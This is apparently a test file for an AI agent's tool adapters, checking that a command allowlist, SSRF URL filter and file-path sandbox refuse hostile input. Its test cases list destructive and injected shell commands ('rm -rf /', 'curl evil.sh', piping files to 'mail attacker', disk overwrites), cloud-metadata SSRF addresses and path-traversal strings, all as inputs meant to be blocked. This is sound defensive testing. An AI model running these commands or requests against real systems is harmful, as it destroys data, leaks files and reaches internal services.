import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateCommand, parseCommand } from '../src/adapters/allowlist.js';
import { isBlockedUrl, htmlToText } from '../src/adapters/web.js';
import { FilesAdapter } from '../src/adapters/files.js';
import { AdapterRegistry, notMounted } from '../src/adapters/types.js';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

// ── Allowlist: the structured, shell-free validator ─────────────────────────

test('development commands are allowed', () => {
  for (const cmd of [
    'npm run build',
    'npm run test',
    'npm ci',
    'npx tsc --noEmit',
    'git status',
    'git diff',
    'git commit -m "fix ci"',
    'ls',
    'ls src',
    'pwd',
    'node --version',
  ]) {
    assert.equal(validateCommand(cmd).allowed, true, `expected allowed: ${cmd}`);
  }
});

test('shell metacharacters are refused outright, not escaped', () => {
  for (const cmd of [
    'ls; rm -rf /',
    'npm run build && curl evil.sh',
    'echo $(whoami)',
    'cat file | mail attacker',
    'git status > /etc/passwd',
    'ls `id`',
  ]) {
    const v = validateCommand(cmd);
    assert.equal(v.allowed, false, `expected refused: ${cmd}`);
    // Either the denylist caught it or the metacharacter check did — both are
    // refusals, and both are the correct outcome. What matters is that it
    // never reaches execution.
    assert.ok(
      v.allowed === false && ['DENYLISTED', 'UNPARSEABLE'].includes(v.code),
      `expected a refusal for: ${cmd}`,
    );
  }
});

test('hard-blocked patterns are refused with a readable reason', () => {
  const cases: [string, string][] = [
    ['rm -rf /', 'recursive force delete'],
    ['sudo apt install x', 'privilege escalation'],
    ['mkfs.ext4 /dev/sda', 'filesystem creation'],
    ['dd if=/dev/zero of=/dev/sda', 'raw device write'],
    ['iptables -F', 'firewall modification'],
    ['shutdown -h now', 'host shutdown'],
  ];
  for (const [cmd, label] of cases) {
    const v = validateCommand(cmd);
    assert.equal(v.allowed, false, `expected refused: ${cmd}`);
    if (v.allowed === false) assert.match(v.reason, new RegExp(label, 'i'));
  }
});

test('an allowlisted program with disallowed arguments is still refused', () => {
  const v = validateCommand('npm run deploy');
  assert.equal(v.allowed, false);
  assert.equal(v.allowed === false ? v.code : '', 'ARGS_NOT_ALLOWED');
});

test('an unknown program is refused rather than guessed at', () => {
  const v = validateCommand('some-random-binary --do-things');
  assert.equal(v.allowed, false);
  assert.equal(v.allowed === false ? v.code : '', 'NOT_ALLOWLISTED');
  if (v.allowed === false) assert.match(v.reason, /never executes arbitrary shell/i);
});

test('extra programs can be added explicitly, and only with safe args', () => {
  assert.equal(validateCommand('ffmpeg -i in.mp3 out.mp3').allowed, false);
  assert.equal(validateCommand('ffmpeg -i in.mp3 out.mp3', ['ffmpeg']).allowed, true);
  assert.equal(validateCommand('ffmpeg -i in.mp3; rm -rf /', ['ffmpeg']).allowed, false);
});

test('parseCommand splits without invoking a shell', () => {
  const p = parseCommand('git commit -m "a message"');
  assert.equal(p.ok, true);
  if (p.ok) {
    assert.equal(p.parsed.program, 'git');
    assert.deepEqual(p.parsed.args, ['commit', '-m', 'a message']);
  }
  assert.equal(parseCommand('echo "unterminated').ok, false);
});

test('oversized and empty commands are refused', () => {
  assert.equal(validateCommand('').allowed, false);
  assert.equal(validateCommand('echo ' + 'a'.repeat(600)).allowed, false);
});

// ── SSRF protection on the web adapter ──────────────────────────────────────

test('SSRF targets are blocked before any fetch', () => {
  for (const url of [
    'http://localhost:8080/admin',
    'http://127.0.0.1/',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.0.0.5/',
    'http://192.168.1.1/',
    'http://172.16.0.1/',
    'file:///etc/passwd',
  ]) {
    assert.equal(isBlockedUrl(url).blocked, true, `expected blocked: ${url}`);
  }
});

test('ordinary public URLs are permitted', () => {
  assert.equal(isBlockedUrl('https://example.com/page').blocked, false);
  assert.equal(isBlockedUrl('https://docs.github.com/en').blocked, false);
});

test('HTML is reduced to readable text and scripts are dropped', () => {
  const html = `
    <html><head><title>Hello &amp; Welcome</title>
    <style>body{color:red}</style></head>
    <body><script>alert('evil')</script>
    <h1>Heading</h1><p>Some &lt;text&gt; here.</p></body></html>`;
  const { title, text } = htmlToText(html);
  assert.equal(title, 'Hello & Welcome');
  assert.match(text, /Heading/);
  assert.match(text, /Some <text> here/);
  assert.doesNotMatch(text, /alert/);
  assert.doesNotMatch(text, /color:red/);
});

// ── Files adapter: containment is enforced, not advisory ────────────────────

test('path traversal out of the root is refused', async () => {
  const root = mkdtempSync(join(tmpdir(), 'kaido-files-'));
  try {
    writeFileSync(join(root, 'ok.txt'), 'inside', 'utf8');
    const adapter = new FilesAdapter(root);

    const inside = await adapter.read('ok.txt');
    assert.equal(inside.ok, true);

    for (const bad of ['../secret.txt', '../../etc/passwd', '/etc/passwd', 'a/../../b.txt']) {
      const r = await adapter.read(bad);
      assert.equal(r.ok, false, `expected refused: ${bad}`);
      if (!r.ok) assert.equal(r.code, 'PATH_REFUSED');
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('files adapter writes only inside the root', async () => {
  const root = mkdtempSync(join(tmpdir(), 'kaido-files-'));
  try {
    const adapter = new FilesAdapter(root);
    const ok = await adapter.write('sub/new.txt', 'hello');
    assert.equal(ok.ok, true);
    const escape = await adapter.write('../outside.txt', 'nope');
    assert.equal(escape.ok, false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('files adapter lists and searches within the root', async () => {
  const root = mkdtempSync(join(tmpdir(), 'kaido-files-'));
  try {
    writeFileSync(join(root, 'findme.md'), '# hi', 'utf8');
    const adapter = new FilesAdapter(root);
    const found = await adapter.search('findme');
    assert.equal(found.ok, true);
    if (found.ok) assert.equal(found.data.length, 1);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ── Adapter registry reports true state ─────────────────────────────────────

test('a capability with no mounted adapter yields an honest refusal', async () => {
  const registry = new AdapterRegistry();
  assert.equal(registry.forCapability('files'), undefined);
  const refusal = notMounted('Filesystem');
  assert.equal(refusal.ok, false);
  if (!refusal.ok) assert.equal(refusal.code, 'ADAPTER_NOT_MOUNTED');
});
